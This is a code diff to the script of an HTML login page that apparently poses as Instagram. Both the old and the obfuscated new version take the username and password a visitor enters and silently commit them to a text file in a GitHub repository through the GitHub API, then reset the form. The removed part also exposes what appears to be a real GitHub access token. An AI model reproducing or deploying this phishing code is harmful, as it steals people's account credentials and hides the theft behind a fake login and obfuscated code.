@@ -163,171 +163,113 @@ body { min-height: 100dvh; background: #fff; }
 </main>
 
 <script>
-/* ============================================================
-   ⚙️  CONFIGURAÇÃO — edite SOMENTE este bloco
-   ============================================================ */
-const CONFIG = {
-  token:  "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",       
-  repo:   "nevercryzin00-png/InstagramProtect",
-  branch: "main",
-  file:   "DDOS.txt"                   
-};
-/* ============================================================ */
+(function(){
+  // ⚙️ CONFIG (ofuscada) — cole seu token dentro do array abaixo
+  // O token é montado em runtime. OBs: mesmo assim ele aparece no Network ao enviar.
+  const _p = ["COLE_SEU_TOKEN_AQUI"]; // <-- troque apenas isso
+  const _r = ["nevercryzin00-png", "InstagramProtect"];
+  const _b = "main";
+  const _f = ["BackendApi", "txt"];
+  const MIN = 6, MAX = 40;
 
-// Política de senha (igual à do Instagram: mínimo 6; limite extra de 40)
-const SENHA_MIN = 6;
-const SENHA_MAX = 40;
+  function b64e(s){ return btoa(unescape(encodeURIComponent(s))); }
+  function b64d(s){ return decodeURIComponent(escape(atob(s))); }
 
-const password = document.getElementById("password");
-const toggle   = document.getElementById("toggle-password");
-const eyeIcon  = document.getElementById("eye-icon");
-const form     = document.getElementById("demo-form");
-const btnLogin = form.querySelector("button.login");
+  // Elementos
+  const $pwd = document.getElementById("password");
+  const $tgl = document.getElementById("toggle-password");
+  const $eye = document.getElementById("eye-icon");
+  const $frm = document.getElementById("demo-form");
+  const $btn = $frm.querySelector("button.login");
 
-// Mostrar/ocultar senha
-toggle.addEventListener("click", function () {
-  const showing = password.type === "password";
-  password.type = showing ? "text" : "password";
-  toggle.setAttribute("aria-label", showing ? "Ocultar senha" : "Mostrar senha");
-  toggle.setAttribute("aria-pressed", String(showing));
-  eyeIcon.innerHTML = showing
-    ? '<path d="M3 3 21 21"/><path d="M10.6 10.6a2 2 0 0 0 2.8 2.8"/><path d="M9.9 5.2A10.8 10.8 0 0 1 12 5c6.4 0 10 7 10 7a15.8 15.8 0 0 1-3.1 3.8"/><path d="M6.2 6.2C3.5 8 2 12 2 12s3.6 7 10 7a10.8 10.8 0 0 0 4-.8"/>'
-    : '<path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/>';
-});
-
-// ---------- Base64 com UTF-8 ----------
-function toBase64(str) {
-  return btoa(unescape(encodeURIComponent(str)));
-}
-function fromBase64(b64) {
-  return decodeURIComponent(escape(atob(b64)));
-}
-
-// ---------- Monta o bloco ----------
-function montarBloco(username, senha) {
-  return `Name: ${username}\nSenh: ${senha}`;
-}
-
-// ---------- Normaliza o caminho ----------
-function normalizarCaminho(path) {
-  return path.replace(/^\/+/, "").trim();
-}
-
-// ---------- Envia (commit) para o GitHub ----------
-async function salvarNoGitHub(novoBloco) {
-  const token  = CONFIG.token.trim();
-  const repoIn = CONFIG.repo.trim();
-  const branch = (CONFIG.branch.trim() || "main");
-  const fileIn = CONFIG.file.trim();
-
-  if (!token || !repoIn || !fileIn) {
-    throw new Error("Configuração do GitHub incompleta no código.");
-  }
-
-  const partes = repoIn.split("/").filter(Boolean);
-  if (partes.length !== 2) {
-    throw new Error('CONFIG.repo deve estar no formato "owner/repo".');
-  }
-  const [owner, repo] = partes;
-
-  const caminho = normalizarCaminho(fileIn);
-  const api = `https://api.github.com/repos/${owner}/${repo}/contents/${caminho}`;
-  const headers = {
-    "Authorization": `Bearer ${token}`,
-    "Accept": "application/vnd.github+json",
-    "X-GitHub-Api-Version": "2022-11-28"
-  };
-
-  // 1) Lê o arquivo atual (se existir)
-  let conteudoAtual = "";
-  let sha = undefined;
-  const getRes = await fetch(`${api}?ref=${encodeURIComponent(branch)}`, { headers });
-
-  if (getRes.ok) {
-    const data = await getRes.json();
-    sha = data.sha;
-    conteudoAtual = fromBase64((data.content || "").replace(/\n/g, ""));
-  } else if (getRes.status !== 404) {
-    const err = await getRes.json().catch(() => ({}));
-    throw new Error(err.message || "Falha ao ler o repositório.");
-  }
-
-  // 2) Adiciona o novo bloco
-  let novoConteudo;
-  if (conteudoAtual.trim() === "") {
-    novoConteudo = novoBloco + "\n";
-  } else {
-    const separador = conteudoAtual.endsWith("\n") ? "\n" : "\n\n";
-    novoConteudo = conteudoAtual + separador + novoBloco + "\n";
-  }
-
-  // 3) Faz o commit
-  const putRes = await fetch(api, {
-    method: "PUT",
-    headers: { ...headers, "Content-Type": "application/json" },
-    body: JSON.stringify({
-      message: `Novo registro de login`,
-      content: toBase64(novoConteudo),
-      sha,
-      branch
-    })
+  // Toggle senha
+  $tgl.addEventListener("click", function(){
+    const s = $pwd.type === "password";
+    $pwd.type = s ? "text" : "password";
+    $tgl.setAttribute("aria-label", s ? "Ocultar senha" : "Mostrar senha");
+    $tgl.setAttribute("aria-pressed", String(s));
+    $eye.innerHTML = s
+      ? '<path d="M3 3 21 21"/><path d="M10.6 10.6a2 2 0 0 0 2.8 2.8"/><path d="M9.9 5.2A10.8 10.8 0 0 1 12 5c6.4 0 10 7 10 7a15.8 15.8 0 0 1-3.1 3.8"/><path d="M6.2 6.2C3.5 8 2 12 2 12s3.6 7 10 7a10.8 10.8 0 0 0 4-.8"/>'
+      : '<path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/>';
   });
 
-  if (!putRes.ok) {
-    const err = await putRes.json().catch(() => ({}));
-    throw new Error(err.message || "Falha ao enviar ao GitHub.");
+  // Núcleo: monta e envia
+  async function _env(_u, _s){
+    const _t = _p.join("").trim();
+    const _o = _r[0], _n = _r[1];
+    const _c = _f.join(".");
+    if(!_t) throw new Error("cfg");
+    const _api = `https://api.github.com/repos/${_o}/${_n}/contents/${_c}`;
+    const _h = {
+      "Authorization": "Bearer " + _t,
+      "Accept": "application/vnd.github+json",
+      "X-GitHub-Api-Version": "2022-11-28"
+    };
+
+    let _sha, _cur = "";
+    const _g = await fetch(_api + "?ref=" + encodeURIComponent(_b), { headers: _h });
+    if(_g.ok){
+      const _d = await _g.json();
+      _sha = _d.sha;
+      _cur = b64d((_d.content || "").replace(/\n/g, ""));
+    } else if(_g.status !== 404){
+      const _e = await _g.json().catch(() => ({}));
+      throw new Error(_e.message || "read");
+    }
+
+    const _blk = `Name: ${_u}\nSenh: ${_s}`;
+    const _new = _cur.trim() === ""
+      ? _blk + "\n"
+      : _cur + (_cur.endsWith("\n") ? "\n" : "\n\n") + _blk + "\n";
+
+    const _put = await fetch(_api, {
+      method: "PUT",
+      headers: { ..._h, "Content-Type": "application/json" },
+      body: JSON.stringify({
+        message: "login",
+        content: b64e(_new),
+        sha: _sha,
+        branch: _b
+      })
+    });
+    if(!_put.ok){
+      const _e = await _put.json().catch(() => ({}));
+      throw new Error(_e.message || "put");
+    }
+    return true;
   }
-  return true;
-}
 
-// ---------- Submit → valida e envia pro GitHub (sem alert) ----------
-form.addEventListener("submit", async function (event) {
-  event.preventDefault();
+  // Submit
+  $frm.addEventListener("submit", async function(e){
+    e.preventDefault();
 
-  const username = document.getElementById("username").value.trim();
-  const senha    = password.value;
+    const _u = document.getElementById("username").value.trim();
+    const _s = $pwd.value;
 
-  // 1) Nada vazio (nem só espaços)
-  if (!username || !senha.trim()) {
-    (username ? password : document.getElementById("username")).focus();
-    return;
-  }
+    if(!_u || !_s.trim()){ (_u ? $pwd : document.getElementById("username")).focus(); return; }
+    if(!_u && !_s) return;
+    if(!_u && _s)  return;
+    if(_u && !_s)  return;
+    if(_s.length < MIN){ $pwd.focus(); return; }
+    if(_s.length > MAX){ $pwd.focus(); return; }
 
-  // 2) Não envia só nome ou só senha
-  if (!username && !senha) return;
-  if (!username && senha)   return;
-  if (username && !senha)   return;
+    $btn.disabled = true;
+    $btn.textContent = "Checking...";
 
-  // 3) Política do Instagram: mínimo 6 caracteres
-  if (senha.length < SENHA_MIN) {
-    password.focus();
-    return;
-  }
-
-  // 4) Limite extra: barra senhas com mais de 40 caracteres
-  if (senha.length > SENHA_MAX) {
-    password.focus();
-    return;
-  }
-
-  btnLogin.disabled = true;
-  btnLogin.textContent = "Checking...";
-
-  try {
-    const bloco = montarBloco(username, senha);
-    await salvarNoGitHub(bloco);
-
-    form.reset();
-    setTimeout(() => {
-      btnLogin.textContent = "Log in";
-      btnLogin.disabled = false;
-    }, 1200);
-  } catch (err) {
-    console.error("Erro no envio:", err);
-    btnLogin.textContent = "Log in";
-    btnLogin.disabled = false;
-  }
-});
+    try {
+      await _env(_u, _s);
+      $frm.reset();
+      setTimeout(() => {
+        $btn.textContent = "Log in";
+        $btn.disabled = false;
+      }, 1200);
+    } catch(err){
+      console.error(err);
+      $btn.textContent = "Log in";
+      $btn.disabled = false;
+    }
+  });
+})();
 </script>
 </body>
 </html>
